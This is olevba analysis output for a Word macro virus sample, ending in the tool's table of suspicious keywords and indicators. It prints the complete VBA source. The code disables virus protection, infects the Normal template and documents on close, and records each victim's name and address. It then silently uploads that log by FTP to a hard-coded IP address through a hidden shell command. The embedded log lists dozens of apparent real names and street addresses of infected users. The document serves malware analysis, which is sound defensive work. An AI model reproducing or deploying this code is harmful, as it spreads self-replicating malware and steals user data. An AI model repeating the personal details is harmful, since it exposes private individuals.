olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-4386faf90c0d7e1519389f5f5346b7f09716c823
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-4386faf90c0d7e1519389f5f5346b7f09716c823 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 02:30:56 PM - Tuesday, 22 Dec 1998
' bd04619
'



' 11:10:36 AM - Tuesday, 5 Jan 1999
' Ingrid W. Romer
'



' 01:33:00 PM - Wednesday, 20 Jan 1999
' Tina Griffin
'



' 05:45:20 PM - Thursday, 21 Jan 1999
' Jack Garber
' Jack Garber
' 11022 Wickshire Way
' North Bethesda, MD 20852



' 03:15:20 PM - Friday, 22 Jan 1999
' Sharon Leaman
'



' 11:14:54 AM - Friday, 29 Jan 1999
' Valued Gateway Customer
'



' 10:02:15 AM - Wednesday, 3 Feb 1999
' Valued Gateway Customer
'



' 10:51:23 AM - Wednesday, 3 Feb 1999
' munsha
'



' 04:04:16 PM - Wednesday, 3 Feb 1999
' Valued Gateway Customer
'



' 10:53:56 AM - Thursday, 4 Feb 1999
' MaryEllen Walsh
'



' 06:30:09 PM - Tuesday, 9 Feb 1999
' maryellw
'



' 12:09:03  - piątek, 26 lut 1999
' Bartek Michalski
'



' 10:05:02  - poniedziałek, 1 mar 1999
' Przemysław Andruszkiewicz
'



' 11:12:04  - czwartek, 11 mar 1999
' ppłk Agaciak
'



' 07:44:15  - piątek, 12 III 1999
' Krzysztof Niziński
'



' 10:54:38  - piątek, 12 mar 1999
' Cezary Opacki
'



' 12:21:03  - piątek, 12 mar 1999
' b032023
'



' 03:07:34  - piątek, 12 mar 1999
' b031011
'



' 05:30:18  - wtorek, 16 mar 1999
' Oddz. Mob.
'



' 02:30:21  - środa, 17 mar 1999
' WP
'



' 06:43:49  - wtorek, 26 paź 1999
' *
'



' 09:41:54  - środa, 26 sty 2000
' -
'



' 10:27:41 PM - sobota, 22 maj 1999
' DODP w Opolu
'



' 05:09:18  - niedziela, 2 lip 2000
' Michał  Palusiński
'



' 09:12:04  - poniedziałek, 12 lut 2001
' Wiesław Andruszko
'



' 09:48:21  - piątek, 30 mar 2001
' Ryszard Kowalczyk
'



' 11:09:37  - niedziela, 20 maj 2001
' Ryszard Kowalczyk
'



' 07:56:02  - środa, 14 lis 2001
' Affanasowicz&Orzeł
'



' 10:00:59  - środa, 21 lis 2001
' XXX
' Pracownia Urbanistyczna
' "AGO - PROJEKT"
' ul. Batorego 6
' 47 - 400 Racibórz



' 11:53:47  - poniedziałek, 3 gru 2001
' UG
'



' 09:54:57  - piątek, 7 gru 2001
' U.S.Rudnik
'



' 09:10:58  - czwartek, 20 lis 2003
' U.S.Rudnik
'



' 11:24:14  - czwartek, 1 gru 2005
' Bernard Ławnik
' Bernard Ławnik
' Wronin
' ul. Głubczycka 47
' 47-260 Polska Cerekiew



' 01:23:41  - czwartek, 12 sty 2006
' Krystian Himel
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

